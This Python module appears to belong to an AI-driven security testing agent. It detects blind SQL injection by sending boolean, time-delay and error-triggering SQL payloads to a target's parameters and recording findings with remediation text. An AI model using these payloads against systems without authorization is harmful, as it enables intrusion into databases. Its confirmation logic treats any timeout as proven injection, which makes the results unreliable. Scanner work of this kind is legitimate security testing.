"""
Tool 13 — test_sqli_blind

Blind SQL injection detection using boolean-based, time-based, and error-based
techniques on parameters in the endpoint inventory.
"""

from __future__ import annotations

import asyncio
import time
from typing import Optional
from urllib.parse import urlencode

import httpx
from loguru import logger

from cyberAI.llm.agent.state import RunState


# Boolean-based pairs: (true_payload, false_payload)
_BOOL_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("admin'--", "admin' AND '1'='2"),
]

# Time-based payloads (MySQL, MSSQL, PostgreSQL, SQLite)
_TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:3'--",           # MSSQL
    "'; SELECT SLEEP(3)--",                  # MySQL
    "' AND SLEEP(3)--",                      # MySQL
    "'; SELECT pg_sleep(3)--",               # PostgreSQL
    "' AND (SELECT 1 FROM (SELECT SLEEP(3)) t)--",
]

# Error-based signatures
_ERROR_PATTERNS = [
    "SQL syntax", "mysql_fetch", "ORA-", "PG::", "syntax error",
    "unclosed quotation", "Microsoft OLE DB", "SQLite3::", "SQLSTATE",
    "supplied argument is not a valid MySQL", "You have an error in your SQL",
    "Warning: pg_", "PostgreSQL query failed", "mysql_num_rows()",
]

_TIME_THRESHOLD = 2.5  # seconds — if response takes >= this with time payload, suspicious


async def _probe_param(
    client: httpx.AsyncClient,
    base: str,
    path: str,
    method: str,
    param: str,
    param_in: str,  # "query", "body", "path"
    headers: dict,
) -> Optional[dict]:
    """
    Test one parameter for SQLi using boolean, time, and error-based techniques.
    Returns a finding dict if confirmed, else None.
    """

    # ----- Boolean-based -----
    for true_payload, false_payload in _BOOL_PAIRS[:2]:
        try:
            if param_in == "query":
                url_true = f"{base}{path}?{urlencode({param: true_payload})}"
                url_false = f"{base}{path}?{urlencode({param: false_payload})}"
                r_true = await client.request(method, url_true, headers=headers)
                r_false = await client.request(method, url_false, headers=headers)
            elif param_in == "body":
                r_true = await client.request(method, path,
                                              json={param: true_payload}, headers=headers)
                r_false = await client.request(method, path,
                                               json={param: false_payload}, headers=headers)
            else:
                continue

            # Boolean detection: different response body length or status
            len_diff = abs(len(r_true.content) - len(r_false.content))
            status_diff = r_true.status_code != r_false.status_code
            if (status_diff or len_diff > 50) and r_true.status_code not in (500,):
                return {
                    "technique": "boolean",
                    "parameter": param,
                    "param_in": param_in,
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "evidence": {
                        "true_status": r_true.status_code,
                        "false_status": r_false.status_code,
                        "len_diff": len_diff,
                    },
                }
        except Exception:
            pass

    # ----- Error-based -----
    error_payload = "'"
    try:
        if param_in == "query":
            r = await client.request(method, f"{base}{path}?{urlencode({param: error_payload})}",
                                     headers=headers)
        elif param_in == "body":
            r = await client.request(method, path, json={param: error_payload}, headers=headers)
        else:
            r = None

        if r and r.status_code in (200, 500):
            text = r.text.lower()
            for pattern in _ERROR_PATTERNS:
                if pattern.lower() in text:
                    return {
                        "technique": "error_based",
                        "parameter": param,
                        "param_in": param_in,
                        "payload": error_payload,
                        "error_pattern": pattern,
                        "evidence": {"response_snippet": r.text[:300]},
                    }
    except Exception:
        pass

    # ----- Time-based -----
    for time_payload in _TIME_PAYLOADS[:2]:
        try:
            t0 = time.monotonic()
            if param_in == "query":
                r = await asyncio.wait_for(
                    client.request(method, f"{base}{path}?{urlencode({param: time_payload})}",
                                   headers=headers),
                    timeout=8.0,
                )
            elif param_in == "body":
                r = await asyncio.wait_for(
                    client.request(method, path, json={param: time_payload}, headers=headers),
                    timeout=8.0,
                )
            else:
                continue
            elapsed = time.monotonic() - t0
            if elapsed >= _TIME_THRESHOLD:
                return {
                    "technique": "time_based",
                    "parameter": param,
                    "param_in": param_in,
                    "payload": time_payload,
                    "evidence": {
                        "response_time_seconds": round(elapsed, 2),
                        "threshold": _TIME_THRESHOLD,
                    },
                }
        except asyncio.TimeoutError:
            # Timeout itself is evidence of time-based SQLi
            return {
                "technique": "time_based",
                "parameter": param,
                "param_in": param_in,
                "payload": time_payload,
                "evidence": {"response_time_seconds": ">8.0 (timeout)", "threshold": _TIME_THRESHOLD},
            }
        except Exception:
            pass

    return None


async def test_sqli_blind(
    endpoint: dict,
    session_name: str = "user_a",
    run_id: str = "",
    state: Optional[RunState] = None,
    target_url: str = "",
) -> dict:
    """
    Tests boolean-based, time-based, and error-based SQLi on all parameters.
    Only runs on endpoints with string/integer parameters.

    Returns confirmed findings with: vulnerable parameter, payload, technique, evidence.
    """
    base = target_url.rstrip("/") if target_url else (
        state.get("target", "").rstrip("/") if state else ""
    )

    sessions = state.get_sessions() if state else {}
    sess = sessions.get(session_name, {})
    jwt = sess.get("jwt", "")

    path = endpoint.get("path", "/")
    method = (endpoint.get("methods") or ["GET"])[0].upper()
    params = endpoint.get("params", [])

    headers = {"Accept": "application/json"}
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"

    # Build test parameters from endpoint metadata
    test_params: list[tuple[str, str]] = []
    for p in params:
        pname = p.get("name", "")
        pin = p.get("in", "query")
        if pname:
            test_params.append((pname, pin))

    # Also try common string params if none found
    if not test_params and method == "GET":
        for pname in ("q", "search", "name", "email", "id", "user", "query", "filter"):
            test_params.append((pname, "query"))

    if not test_params:
        return {
            "confirmed_sqli": False,
            "reason": "No testable parameters found",
            "endpoint": path,
            "tests_run": 0,
        }

    findings: list[dict] = []
    tests_run = 0

    async with httpx.AsyncClient(base_url=base, timeout=10.0, verify=False) as client:
        for pname, pin in test_params[:20]:
            tests_run += 1
            result = await _probe_param(client, base, path, method, pname, pin, headers)
            if result:
                severity = "critical" if result["technique"] == "error_based" else "high"
                finding_data = {
                    "type": "SQLI",
                    "subtype": result["technique"],
                    "title": f"Blind SQLi ({result['technique']}) in {method} {path} — param: {pname}",
                    "endpoint": path,
                    "method": method,
                    "severity": severity,
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    "owasp_category": "A03:2021 Injection",
                    "cwe_id": "CWE-89",
                    "status": "confirmed",
                    "reproduction_count": 1,
                    "evidence": result,
                    "remediation": (
                        f"Use parameterized queries / prepared statements for the {pname} parameter. "
                        "Never concatenate user input into SQL queries."
                    ),
                    "run_id": run_id,
                    "target": base,
                }
                finding_id = ""
                if state:
                    finding_id = state.add_finding(finding_data)
                    state.write_log("test", "WARNING", "test_sqli_blind",
                                    f"CONFIRMED SQLi ({result['technique']}) on {path}?{pname}")
                    logger.warning(f"test_sqli_blind: CONFIRMED on {path}?{pname} technique={result['technique']}")
                findings.append({**result, "endpoint": path, "finding_id": finding_id, "severity": severity})
                break  # One confirmed finding per endpoint is enough

    return {
        "confirmed_sqli": len(findings) > 0,
        "findings": findings,
        "endpoint": path,
        "tests_run": tests_run,
    }
